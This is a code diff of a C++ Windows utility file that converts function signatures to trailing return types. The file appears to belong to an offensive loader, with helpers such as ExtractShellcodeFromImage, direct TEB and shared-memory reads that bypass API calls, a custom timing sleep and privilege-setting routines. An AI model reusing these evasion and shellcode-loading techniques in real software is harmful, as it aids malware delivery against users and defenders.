@@ -7,7 +7,7 @@ static auto& dynamicInvoker = DynamicInvoker::get_instance();
 
 // DebugPrint
 #ifdef _DEBUG
-void DebugPrintA(const char* format, ...) {
+auto DebugPrintA(const char* format, ...) -> void {
 	char buffer[1024];
 	va_list args;
 	va_start(args, format);
@@ -16,7 +16,7 @@ void DebugPrintA(const char* format, ...) {
 	OutputDebugStringA(buffer);
 	std::cout << buffer << std::endl;
 }
-void DebugPrintW(const wchar_t* format, ...) {
+auto DebugPrintW(const wchar_t* format, ...) -> void {
 	wchar_t buffer[1024];
 	va_list args;
 	va_start(args, format);
@@ -26,14 +26,14 @@ void DebugPrintW(const wchar_t* format, ...) {
 	std::wcout << buffer << std::endl;
 }
 #else
-void DebugPrintA(const char* format, ...) {}
-void DebugPrintW(const wchar_t* format, ...) {}
+auto DebugPrintA(const char* format, ...) -> void {}
+auto DebugPrintW(const wchar_t* format, ...) -> void {}
 
 #endif
 
 
 
-LPSTR charToLPSTR(const char* str) {
+auto charToLPSTR(const char* str) -> LPSTR {
 	if (str == nullptr) {
 		return nullptr;
 	}
@@ -48,7 +48,7 @@ LPSTR charToLPSTR(const char* str) {
 
 	return lpstr;
 }
-LPCWSTR charToLPCWSTR(const char* charString) {
+auto charToLPCWSTR(const char* charString) -> LPCWSTR {
 	// Calculate the size needed for the wide string buffer
 	int size_needed = MultiByteToWideChar(CP_ACP, 0, charString, -1, NULL, 0);
 
@@ -64,7 +64,7 @@ LPCWSTR charToLPCWSTR(const char* charString) {
 
 	return wideString;
 }
-LPWSTR charToLPWSTR(const char* charString) {
+auto charToLPWSTR(const char* charString) -> LPWSTR {
 	// Calculate the size needed for the wide string buffer
 	int size_needed = MultiByteToWideChar(CP_ACP, 0, charString, -1, NULL, 0);
 
@@ -81,7 +81,7 @@ LPWSTR charToLPWSTR(const char* charString) {
 	return wideString;
 }
 
-DWORD myGetCurrentThreadId() {
+auto myGetCurrentThreadId() -> DWORD {
 	static PTEB teb;
 	if (!teb) {
 		teb = (PTEB)__readgsqword(0x30);
@@ -90,7 +90,7 @@ DWORD myGetCurrentThreadId() {
 }
 
 
-DWORD myGetCurrentProcessId() {
+auto myGetCurrentProcessId() -> DWORD {
 	static PTEB teb;
 	if (!teb) {
 		teb = (PTEB)__readgsqword(0x30);
@@ -98,20 +98,20 @@ DWORD myGetCurrentProcessId() {
 	return (DWORD)(teb->ClientId.UniqueProcess);
 }
 
-ULONG64 AR_getTickcount64() {
+auto AR_getTickcount64() -> ULONG64 {
 	PKUSER_SHARED_DATA sharedData = (PKUSER_SHARED_DATA)(0x7FFE0000);
 	ULONG64 uptime = ((sharedData->TickCountMultiplier) * (sharedData->TickCountQuad)) >> 24;
 	return uptime;
 }
 
-__forceinline wchar_t locase_w(wchar_t c)
+__forceinline auto locase_w(wchar_t c) -> wchar_t
 {
 	if ((c >= 'A') && (c <= 'Z'))
 		return c + 0x20;
 	else
 		return c;
 }
-wchar_t* _strstri_w(const wchar_t* s, const wchar_t* sub_s)
+auto _strstri_w(const wchar_t* s, const wchar_t* sub_s) -> wchar_t*
 {
 	wchar_t c0, c1, c2, * tmps, * tmpsub;
 
@@ -154,7 +154,7 @@ wchar_t* _strstri_w(const wchar_t* s, const wchar_t* sub_s)
 	return 0;
 }
 
-BOOL ExtractShellcodeFromImage(LPCWSTR imagePath, PBYTE* shellcode, DWORD* size) {
+auto ExtractShellcodeFromImage(LPCWSTR imagePath, PBYTE* shellcode, DWORD* size) -> BOOL {
     Gdiplus::GdiplusStartupInput gdiplusStartupInput;
     ULONG_PTR gdiplusToken;
     Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
@@ -236,7 +236,7 @@ BOOL ExtractShellcodeFromImage(LPCWSTR imagePath, PBYTE* shellcode, DWORD* size)
     Gdiplus::GdiplusShutdown(gdiplusToken);
     return TRUE;
 }
-std::string WideToUtf8(const std::wstring& wstr) {
+auto WideToUtf8(const std::wstring& wstr) -> std::string {
 	if (wstr.empty()) return {};
 
 	int size_needed = WideCharToMultiByte(CP_UTF8, 0, wstr.data(), -1, nullptr, 0, nullptr, nullptr);
@@ -245,7 +245,7 @@ std::string WideToUtf8(const std::wstring& wstr) {
 	return result;
 }
 
-std::string EscapeJsonString(const std::string& input) {
+auto EscapeJsonString(const std::string& input) -> std::string {
 	std::string output;
 	for (char c : input) {
 		switch (c) {
@@ -270,7 +270,7 @@ std::string EscapeJsonString(const std::string& input) {
 	return output;
 }
 
-std::string Base64Decode(const std::string& encoded) {
+auto Base64Decode(const std::string& encoded) -> std::string {
 	static const std::string base64_chars =
 		"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
 		"abcdefghijklmnopqrstuvwxyz"
@@ -320,7 +320,7 @@ std::string Base64Decode(const std::string& encoded) {
 }
 
 
-void custom_sleep(int milliseconds) {
+auto custom_sleep(int milliseconds) -> void {
 	LARGE_INTEGER frequency;  // 计时器频率
 	LARGE_INTEGER start, now;  // 开始时间和当前时间
 	double elapsedTime;
@@ -336,7 +336,7 @@ void custom_sleep(int milliseconds) {
 	} while (elapsedTime < milliseconds);
 }
 
-BOOL IsRunningAsAdmin()
+auto IsRunningAsAdmin() -> BOOL
 {
 	HANDLE hToken = NULL;
 	TOKEN_ELEVATION elevation;
@@ -361,7 +361,7 @@ BOOL IsRunningAsAdmin()
 	return elevation.TokenIsElevated;
 }
 
-BOOL SetPrivilege(LPCWSTR privilege)
+auto SetPrivilege(LPCWSTR privilege) -> BOOL
 {
 	// 64-bit only
 	if (sizeof(LPVOID) != 8)
